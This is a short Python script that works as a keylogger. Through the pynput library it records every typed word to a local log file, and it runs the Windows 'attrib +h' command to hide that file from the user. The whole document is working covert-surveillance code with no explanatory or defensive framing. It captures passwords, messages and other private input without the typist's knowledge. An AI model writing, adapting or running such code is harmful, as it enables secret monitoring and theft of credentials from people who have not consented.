from pynput import *
import logging
from pynput import *
from pynput.keyboard import *
import subprocess
file_name = "./logHidden.txt"

logging.basicConfig(filename=(file_name), level=logging.DEBUG, format='%(message)s')
subprocess.run(["attrib", "+h", file_name])

global word
word = ""

def on_press(key):
    global word
    try:
        if key == Key.space or key == Key.enter:
            logging.info(str(word))
            word = ""
        else:
            word += key.char
    except:
        return

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
